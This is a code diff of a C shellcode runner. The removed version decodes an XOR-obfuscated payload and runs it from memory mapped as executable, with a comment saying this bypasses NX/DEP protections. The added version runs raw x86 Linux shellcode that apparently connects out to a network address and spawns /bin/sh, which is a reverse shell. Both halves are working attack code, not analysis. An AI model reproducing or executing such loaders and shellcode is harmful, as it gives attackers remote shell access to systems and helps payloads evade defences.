@@ -1,43 +1,11 @@
 #include <stdio.h>
-#include <stdlib.h>
 #include <string.h>
-#include <sys/mman.h>
-#include <unistd.h>
 
-int main() {
-    // 1. Raw assembly instructions + payload data, entirely obfuscated.
-    // Every single byte is XOR-encoded with 0xAA. No raw \x00 bytes present.
-    unsigned char payload[] =
-        "\x62\xec\x25\xaa\xaa\xaa\xaa\xc2\xcc\xc7\xde\xc2\xcc\xc4\xdf"
-        "\xc2\xcc\xc5\xdc\xe2\xc2\xd2\x25\x21\x21\xaa\xaa\xeb\x9a\xf4"
-        "\xe1\xee\xa8\x1e\xe1\xee\x6b\xaa\xe3\xd6\xe2\xda\x22\xba\x31"
-        "\xe3\xf2\xec\xd2\x25\x21\x21\xaa\xaa\x4f\x31\xeb\x9a\xf4\x6b"
-        "\x4a\x9d\x9c\x97\x8e\x90\x8e\x90\x8e\x9b\xc2\xde\x25\xaa\xaa"
-        "\xaa\xaa\xeb\x9a\xf4\xe2\xcc\xe6\xc2\xcc\x95\x85\x95\xc2\xc5"
-        "\x25\xaa\xaa\xaa\xaa\xeb\x9a\xf4\xeb\xb3\xcc\x9d\xdd\xd5\xd4"
-        "\xd5\xc3\xdc\xaa";
-
-    size_t payload_len = sizeof(payload) - 1;
-
-    // 2. Decode the payload back into active machine code instructions
-    for (size_t i = 0; i < payload_len; i++) {
-        payload[i] = payload[i] ^ 0xAA;
-    }
-
-    // 3. Allocate a memory page aligned specifically for execution permissions
-    // This bypasses NX/DEP protections that would cause stack corruption errors.
-    void* exec_mem = mmap(NULL, payload_len, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
-
-    if (exec_mem == MAP_FAILED) {
-        return 1;
-    }
-
-    // 4. Move the decrypted assembly instructions into our executable buffer
-    memcpy(exec_mem, payload, payload_len);
-
-    // 5. Cast the buffer to a function pointer type and execute it directly
-    void (*run_shellcode)() = (void (*)())exec_mem;
-    run_shellcode();
-
+int main(void)
+{
+    unsigned char code[] = "\x89\xe5\x31\xc0\x31\xc9\x31\xd2\x50\x50\xb8\x03\x03\x03\x03\xbb\x09\x01\x03\x02\x31\xc3\x53\x66\x68\xff\xf0\x66\x6a\x02\x31\xc0\x31\xdb\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc3\x66\xb8\x6a\x01\x89\xe1\x89\xea\x29\xe2\xcd\x80\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x49\xcd\x80\x41\xe2\xf6\x31\xc0\x31\xd2\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80";
+    printf("Shellcode length: %d\n", strlen(code));
+    void (*s)() = (void *)code;
+    s();
     return 0;
 }
